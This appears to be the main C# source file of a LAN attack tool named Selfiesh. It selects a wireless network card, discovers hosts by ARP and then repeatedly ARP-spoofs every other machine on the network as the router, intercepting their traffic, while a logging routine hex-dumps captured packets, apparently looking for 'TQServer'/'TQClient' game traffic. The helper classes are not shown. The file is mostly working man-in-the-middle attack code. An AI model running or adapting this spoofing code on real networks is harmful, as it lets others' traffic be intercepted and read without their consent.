using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.NetworkInformation;

namespace Selfiesh
{
    class Program
    {
       
        static string[] sequence = new string[] { "/", "-", "\\", "|" };
        static bool Disconverying = false;
        static bool Redirecting = false;
        public static void Handle()
        {
            try
            {
                while (true)
                {
                    if (selectedNic == null)
                    {
                        Start = DateTime.Now;
                        CheckingNetworkCards();
                    }
                    else if (!WorkingProcess)
                    {
                        SearchingIntoNetwork();
                    }
                    else if (!Disconverying)
                    {
                        Disconverying = true;
                        cArp.startArpDiscovery();
                    }
                    else if (!Redirecting && DateTime.Now >= Start.AddSeconds(20))
                    {
                        Redirecting = true;
                        new System.Threading.Thread(StartSpoofing).Start();                      
                    }
                    System.Threading.Thread.Sleep(1);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
        public static DateTime Start;
        static bool Spoofed = true;
        public static void StartSpoofing()
        {
            try
            {
                while (true)
                {
                    foreach (var pc in Socket.Pool.ToList())
                    {
                        if (!pc.isLocalPc && !pc.isGateway)
                        {
                            
                            if(Spoofed)
                            Console.WriteLine("Spoofing:" + pc.name + "\n");
                            Client pcFromIp = Socket.GetClientFromIP(Socket.getIpAddress(pc.ip.ToString()).GetAddressBytes());
                            cArp.Spoof(pcFromIp.ip, new System.Net.IPAddress(cArp.routerIP));
                        }
                    }
                    Spoofed = false;
                    System.Threading.Thread.Sleep(1);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
        public static bool WorkingProcess = false;
        public static Arp cArp;
        public static Socket Socket;
             public static NetworkInterface[] nics;
        public static NetworkInterface selectedNic;
        public static List<NetworkInterface> NetworkCardList = new List<NetworkInterface>();
        static void Main(string[] args)
        {
            new System.Threading.Thread(Handle).Start();
            for (; ; )
                Console.ReadLine();
        }
        public static bool Animate = false;
        public static void Animation()
        {
            var loaderChars = new[] { '/', '-', '\\', '|' };
            var a = 0;
            Animate = true;
            while (true)
            {
                if (Animate)
                {
                    System.Console.SetCursorPosition(System.Console.CursorLeft -1, System.Console.CursorTop);
                    System.Console.Write(loaderChars[a++]);
                    a = a == loaderChars.Length ? 0 : a;
                    System.Threading.Thread.Sleep(300);
                }
                else
                {
                    break;
                }
            }
        }
        public static void PauseAnim()
        {
            Animate = false;
        }
        public static void CheckingNetworkCards()
        {
            Console.Title = "Trying to find NIC";
            Console.WriteLine("Searching for NIC  ",ConsoleColor.Gray);
            new System.Threading.Thread(Animation).Start();
           // Turn();
            nics = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
                {
                    foreach (UnicastIPAddressInformation ip in nic.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork && nic.GetIPProperties().GatewayAddresses.Count > 0 && nic.OperationalStatus == OperationalStatus.Up && nic.Name.Contains("Wi"))
                        {
                            NetworkCardList.Add(nic);
                            selectedNic = nic;
                            PauseAnim();
                            System.Console.SetCursorPosition(System.Console.CursorLeft - 1, System.Console.CursorTop);
                            System.Console.WriteLine("(Done)");
                            Console.WriteLine("Selected NIC:" + nic.Name +"\n",ConsoleColor.Red);
                        }
                    }
                }
            }
        }
        public static void SearchingIntoNetwork()
        {
            Socket = new Socket();
            Arp carp = new Arp(selectedNic, Socket);
            cArp = carp;
            carp.startArpListener();
            cArp.findMacRouter();
            Client pc = new Client();
            pc.ip = new System.Net.IPAddress(cArp.localIP);
            pc.mac = new PhysicalAddress(cArp.localMAC);         
            pc.capDown = 0;
            pc.capUp = 0;
            pc.isLocalPc = true;
            pc.name = string.Empty;
            pc.nbPacketReceivedSinceLastReset = 0;
            pc.nbPacketSentSinceLastReset = 0;
            pc.redirect = false;
            DateTime now = DateTime.Now;
            pc.timeSinceLastRarp = (ValueType)now;
            pc.totalPacketReceived = 0;
            pc.totalPacketSent = 0;
            pc.isGateway = false;
            Socket.AddClient(pc);
            WorkingProcess = true;

        }
        static int counter;
        public static void Turn()
        {
            counter++;

            if (counter >= sequence.Length)
                counter = 0;

            Console.WriteLine(sequence[counter]);
            System.Console.SetCursorPosition(System.Console.CursorLeft - sequence[counter].Length, System.Console.CursorTop);
        }
        public static void SavePacket(byte[] packet)
        {
            string fullPath = System.IO.Path.GetDirectoryName(Environment.GetCommandLineArgs()[0])
            +"\\" +"Packets";
            string li = null;
            li = log2("Packet", packet);
            System.IO.File.WriteAllText(fullPath + ".txt", li);

        }
        public static string log2(string name, byte[] Data)
        {
            string result = "---------------------------------------";
            result += Environment.NewLine;
            try
            {
                if (Data == null)
                {
                    result = "";
                    return result;
                }
                ushort num = (ushort)Data.Length;
                if (Encoding.ASCII.GetString(Data).Contains("TQServer") || Encoding.ASCII.GetString(Data).Contains("TQClient"))
                {
                    num += 8;
                }
                if ((int)num > Data.Length)
                {
                    num = (ushort)Data.Length;
                }
                string text = "";
                object obj = text;
                text = string.Concat(new object[]
				{
					obj,
					name,
					" Packet Length : ",
					num,
					", PacketType: ",
					BitConverter.ToInt16(Data, 2),
					Environment.NewLine
				});
                int num2 = 0;
                while ((double)num2 < Math.Ceiling((double)num / 16.0))
                {
                    int num3 = 16;
                    if ((num2 + 1) * 16 > (int)num)
                    {
                        num3 = (int)num - num2 * 16;
                    }
                    for (int i = 0; i < num3; i++)
                    {
                        text = text + Data[num2 * 16 + i].ToString("X2") + " ";
                    }
                    if (num3 < 16)
                    {
                        for (int i = num3; i < 16; i++)
                        {
                            text += "   ";
                        }
                    }
                    text += "     ;";
                    for (int i = 0; i < num3; i++)
                    {
                        text += Convert.ToChar(Data[num2 * 16 + i]);
                    }
                    text += Environment.NewLine;
                    num2++;
                }
                text.Replace(Convert.ToChar(0), '.');
                text += Environment.NewLine;
                result += text;
                //Console.WriteLine(result);
                return result;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            result = "";
            return result;
        }
    }
}
